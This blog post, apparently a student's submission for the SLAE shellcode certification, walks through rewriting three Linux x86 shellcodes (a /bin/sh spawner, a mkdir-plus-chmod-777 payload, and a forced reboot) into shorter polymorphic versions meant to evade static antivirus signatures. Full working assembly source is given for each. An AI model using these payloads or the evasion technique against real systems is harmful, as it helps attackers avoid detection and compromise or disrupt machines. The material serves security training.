## SLAE Exam Assignment 6 - Creating polymorphic shellcode

## Prologue
The second last assignment of the SLAE certification exam was quite an intriguing one. We were told to take three shellcodes of our choosing from [shell-storm](https://www.shell-storm.org/shellcode/) or [exploit-db](https://www.exploit-db.com/shellcodes) and create Polymorphic versions of those to evade _static signature-based_ AV/EDRs. Needless to say, it was a quite fun and brain-racking challenge.

What's more? We were told that extra brownie-points would be given if the polymorphic shellcodes were smaller than the original.

So without any further ado, let's get down with it!

## What is a polymorphic shellcode?
It is impossible to explain polymorphic shellcode if we don't understand what is polymorphism.

Polymorphism comes from the Greek words: _poly_ meaning "many" and _morph_ meaning "forms". In other words it roughly translates to "many forms of the same thing".

Now let's understand what we mean by polymorphic shellcode with the help of a tiny example.

Each shellcode is crafted for a specific purpose right? Say there's a Reverse TCP shellcode which connects back to an attacker server for execution of arbritary commands. This shellcode was used many times in the past by an attacker along with an exploit to get access to a remote machine and exfiltrate data. Now the AV/EDR vendors have caught up to it and they have written signatures to detect this payload. Say a wannabe pen-tester get their hands on this payload and they too want to use this payload so they quickly decide to test this payload in a live-environment of their own before deploying it but alas! As soon as they fire up the payload, it gets detected by a commercial AV. This can't be any good!

Enter polymorphic shellcode!

So this script-kiddie gives this assembly code that he found to an 1337 hacker and he in return gives him back a modified payload which surprisingly runs as expected without any detections much to this script-kiddie's surprise. So what did this 1337 hacker do?

He basically modified the source that he received to beat _static signature analysis_. In other words, he created a polymorphic shellcode from the original source that has the same functionality but a different signature this time since he addded some new instructions, deleted some old instructions, added some NOP instructions yada yada yada.

Now that we know what is polymorphic shellcode and how it is useful for us, let's get our hands dirty with creating some!

## First polymorphic shellcode - execve(/bin/sh)
[Here](http://shell-storm.org/shellcode/files/shellcode-827.php) is the link to the original shellcode.

Original assembly source:

```nasm
xor eax, eax
push eax
push dword 0x68732f2f
push dword 0x6e69622f
mov ebx, esp
push eax
push ebx
mov ecx, esp
mov al, 0x0b
int 0x80
```

Polymorphic assembly source:

```nasm
xor eax, eax           ; Clearing out EAX register
xor ecx, ecx           ; Clearing out ECX regsiter
push eax               ; push for NULL termination
push dword 0x68732f2f  ; push //sh
push dword 0x6e69622f  ; push /bin
mov ebx, esp           ; store address of TOS - /bin//sh
mov al, 0x0b           ; store Syscall number for execve() = 11 OR 0x0b in AL
int 0x80               ; Execute the system call
```

Length of original shellcode: `23 bytes`

Length of polymorphic shellcode: `21 bytes`

Size Reduction: `9%`

For the first assignment I took a very simple shellcode which executes /bin/sh so I will not go into too much detail on how it works. I just bastardized the execve call and made the following modifications:

1. Removed the null termination push after /bin//sh
1. Removed the ECX pointing to argv[]

Let's see a demo of the shellcode in action now:

<script id="asciicast-WGxT2keT6AO81KpWMraSVUt4n" src="https://asciinema.org/a/WGxT2keT6AO81KpWMraSVUt4n.js" async></script>

## Second polymorphic shellcode - create dir + chmod 777 + exit
[Here](https://www.exploit-db.com/exploits/37358) is the link to the original shellcode.

Original assembly source:

```nasm
xor eax, eax
push eax
push dword 0x4b434148
mov al, 0x27
mov ebx, esp
inc cx
int 0x80
mov al, 0xf
mov cx, 0x1ff
int 0x80
xor eax, eax
inc eax
int 0x80
```

Polymorphic assembly source:

```nasm
xor eax, eax                 ; Clearing out EAX register
push eax                     ; PUSH for NULL termination
push dword 0x4b434148        ; PUSH dir name HACK
mov al, 0x27                 ; Load 0x27 syscall val for mkdir in AL 
mov ebx, esp                 ; Store address of TOS in EBX
int 0x80                     ; Executing mkdir syscall
mov al, 0xf                  ; Load 0x0f syscall val for chmod in AL
mov cx, 0x1ff                ; Load permission to CX
int 0x80                     ; Executing chmod syscall
inc eax                      ; Incrementing val of EAX to 1 - exit
int 0x80                     ; Executing exit syscall
```

Length of original shellcode: `29 bytes`

Length of polymorphic shellcode: `25 bytes`

Size Reduction: `14%`

This is a shellcode which will create a directory named "HACK"(modifiable), set the permission of the directory to 777 using chmod and then exit gracefully.

The modifications made for creating the polymorphic shellcode are as follows:

1. Removed the XOR'ing of EAX to clear itself for the exit syscall because we don't really need that.
1. Removed the INC of CX by 1 before syscall of mkdir as an optional argument because again it is not strictly necessary.

There isn't much left to further decrease the size but hey we did decrease it by 14%!

Let's see a demo of the shellcode in action now:

<script id="asciicast-rhGNnD45lsmXLIXTluTbKOB49" src="https://asciinema.org/a/rhGNnD45lsmXLIXTluTbKOB49.js" async></script>

## Third polymorphic shellcode - force system reboot 
[Here](http://shell-storm.org/shellcode/files/shellcode-831.php) is the link to the original shellcode.

Original assembly source:

```nasm
xor eax, eax
push eax
push 0x746f6f62
push 0x65722f6e
push 0x6962732f
mov ebx, esp
push eax
push word 0x662d
mov esi, esp
push eax
push esi
push ebx
mov ecx, esp
mov al, 0xb
int 0x80
```

Polymorphic assembly source:

```nasm
xor eax, eax            ; Clearing the EAX register
xor ebx, ebx            ; Clearing the EBX register
xor ecx, ecx            ; Clearing the ECX register
cdq                     ; Clearing the EDX register
mov al, 0x58            ; Loading syscall value = 0x58 for reboot in AL
mov ebx, 0xfee1dead     ; Loading magic 1 in EBX
mov ecx, 672274793      ; Loading magic 2 in ECX
mov edx, 0x1234567      ; Loading cmd val = LINUX_REBOOT_CMD_RESTART in EDX
int 0x80                ; Executing the reboot syscall
```

Length of original shellcode: `36 bytes`

Length of polymorphic shellcode: `26 bytes`

Size Reduction: `28%`

I have saved the best for the last and it's needless to say this is a shellcode that will force a system reboot.

For this one I actually took a different approach altogether and ended up minimising the shellcode length by `10 bytes`. Here is what I have done:

1. The original shellcode uses execve on /usr/sbin/reboot to cause a system reboot. I searched the linux syscall table online and found that there is a separate syscall for reboot(0x58) and I decided to execute that syscall rather than trying to remove optional instructions from the original shellcode in an effort to minimise it as much as possible. The result is a completely polymorphic shellcode that is 10 bytes lesser than the original. 

The assembly source is commented throughout ergo I won't be discussing that in more details.

With that, we conclude our blog post on creating polymorphic shellcode.

## Code links:
All the code referred to or used in this project is listed as follows:

1. [1st polymorphic shellcode](https://github.com/upayansaha/SLAE-Code-Repository/tree/master/Assignment%206/1st%20Shellcode)
1. [2nd polymorphic shellcode](https://github.com/upayansaha/SLAE-Code-Repository/tree/master/Assignment%206/2nd%20Shellcode)
1. [3rd polymorphic shellcode](https://github.com/upayansaha/SLAE-Code-Repository/tree/master/Assignment%206/3rd%20Shellcode)

Feel free to use and modify all of the above code as and when you see fit. 

Cheers!

## Note:
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

<br />

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

<br />

Student ID: SLAE-1525
